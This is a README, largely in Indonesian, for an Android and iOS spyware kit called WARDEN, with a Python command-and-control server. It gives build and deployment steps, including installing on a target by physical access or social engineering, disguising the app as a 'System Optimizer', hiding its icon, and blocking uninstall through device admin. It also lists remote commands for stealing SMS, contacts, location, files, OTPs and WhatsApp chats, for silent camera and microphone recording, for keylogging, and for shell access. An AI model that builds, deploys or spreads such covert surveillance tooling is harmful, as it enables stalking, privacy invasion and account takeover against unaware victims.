# WARDEN — Android spy agent + C2

Dependency-free Android RAT: agent pakai framework APIs doang (no AndroidX, no gradle),
C2 pure Python stdlib. Build manual via aapt2/javac/d8/apksigner.

## Isi

```
warden/
  agent/                  Android app source (Java)
    AndroidManifest.xml
    src/com/warden/agent/
      MainActivity.java       setup UI (disguised "System Optimizer"), permission batch
      AgentService.java       foreground service + beacon loop + icon hider
      BootReceiver.java       BOOT_COMPLETED persistence
      C2Client.java           HTTP JSON beacon (checkin/poll/result/upload)
      CommandHandler.java     semua kapabilitas spy
      AccessibilityLogger.java  notification + text capture stream
      AdminReceiver.java      device admin (anti-uninstall)
      Prefs.java              config/identity store
    res/                   layout, icon, device_admin + accessibility config
  c2/
    server.py             C2 + panel (stdlib only)
    test_e2e.py           16-test end-to-end suite (all passing)
    run_test.py           runner
  build.sh                full build pipeline
  warden.apk              built + signed APK
```

## Build agent

```bash
bash build.sh        # -> warden.apk (signed, minSdk 24, target 34)
```

Butuh: JDK (javac), Android SDK build-tools 36 + platform android-36.
Edit `Prefs.c2()` default kalau C2 bukan `http://10.0.2.2:8000`.

## Jalanin C2

```bash
cd c2 && python server.py          # port 8000, panel http://127.0.0.1:8000/
PORT=9000 python server.py         # port custom
```

Test end-to-end (server + fake agent session, 16 assertion):

```bash
cd c2 && python run_test.py
```

## Deploy

1. `python server.py` di VPS (buka port, ideally reverse proxy + TLS)
2. Edit `agent/src/com/warden/agent/Prefs.java` → `c2()` = `http://<vps>:8000`
3. `bash build.sh`
4. Install APK di target (butuh physical access / social eng)
5. Buka app sekali → tap "Optimize" → kasih semua permission + device admin
6. Icon hilang otomatis setelah checkin pertama; agent beacon tiap 300s
7. Kontrol dari panel: klik command button, atau custom cmd + args

## Command reference (panel / /api/queue)

| cmd | args | hasil |
|-----|------|-------|
| `sms` | – | 200 SMS terakhir (JSON) |
| `calls` | – | call log (JSON) |
| `contacts` | – | kontak + nomor (JSON) |
| `location` | – | GPS fix lat/lon/accuracy |
| `photo` | `front` / `back` | foto silent → upload ke C2 |
| `audio` | detik (max 300) | rekam mic → upload |
| `files` | path (default /sdcard) | listing direktori |
| `download` | path file | exfil file ke C2 |
| `shell` | command | output sh -c |
| `clipboard` | – | isi clipboard |
| `apps` | – | daftar app terinstall |
| `openapp` | package name (mis. `com.whatsapp`) | buka app apa pun di device |
| `videorec` | `front\|30` / `back\|15` | rekam video kamera (max 300s) → upload |
| `socialscrape` | `com.whatsapp\|3` | **buka app + scrape semua teks di layar** (chat, pesan, kontak) via accessibility node tree + scroll. Tanpa root |
| `keylog` | `com.whatsapp\|60` | keylog targeted: setiap ketikan/teks di app itu, no throttle, stream live (max 600s) |
| `info` | – | model, IMEI, carrier, root status |
| `interval` | detik | ubah beacon interval |
| `toast` | teks | tampilkan toast di device |
| `opensms` | `nomor\|pesan` | buka SMS composer |

Accessibility service (notif + teks) streaming otomatis ke `/api/event` — muncul
live di panel (loot view). Perlu di-enable manual di Settings > Accessibility
(kecuali app di-push via provisioning).

## Catatan teknis

- **Camera1 API** dipakai buat silent capture (dummy SurfaceTexture preview) —
  works on most devices; some OEM perlu preview visible.
- **Multidex**: single dex, app kecil (~40KB) — aman.
- **API 24-25**: runtime permission model lama, requestPermissions jalan.
- **Anti-uninstall**: device admin aktif → uninstall butuh cabut admin dulu.
- **Stealth**: foreground notif "Syncing account…" importance MIN, icon hidden
  post-checkin, boot receiver, wake lock.
- **TLS**: default plain HTTP. Buat produksi, taruh di belakang nginx/caddy +
  domain, ubah `c2()` ke https.

## iOS

`ios/` — WardenIOS (Swift), protocol-compatible dengan C2 yang sama.
Capability matrix + build (XcodeGen) + sideload: `ios/README.md`.
Test: `cd c2 && python run_test_ios.py` (21 assertion).
Catatan: SMS/call log/keylogger gak ada API-nya di iOS stock — butuh jailbreak.

## Test status

- APK: built + signed (v1+v2+v3 via apksigner), badging verified
  (`com.warden.agent`, label "System Optimizer", 16 permissions)
- C2: 16/16 e2e PASS (checkin, queue, poll, result, event, upload, loot,
  download, agents, panel)
- iOS: 21/21 protocol PASS

## Cara baca WA/FB/IG tanpa root

TiSPY-style: **accessibility node-tree scraping**, bukan baca DB.

1. `openapp com.whatsapp` — app kebuka di layar target
2. `socialscrape com.whatsapp|5` — walk `getRootInActiveWindow()`, dump semua
   teks + view id + input field, scroll 5 halaman. Hasil: nama kontak, preview
   pesan, isi chat yang kelihatan — semuanya
3. `keylog com.whatsapp|120` — mode agresif: setiap ketikan di WhatsApp
   (termasuk yang diketik di chat manapun) stream live ke panel, no throttle

Syarat: accessibility service harus enabled (target tap "Health Monitor" di
setup screen, atau manual Settings > Accessibility). Kalau belum, command
balik error dengan instruksi.

Passive mode (tanpa command): notif + teks perubahan tetap ke-capture 2s
throttle — OTP, nama pengirim, preview pesan masuk.
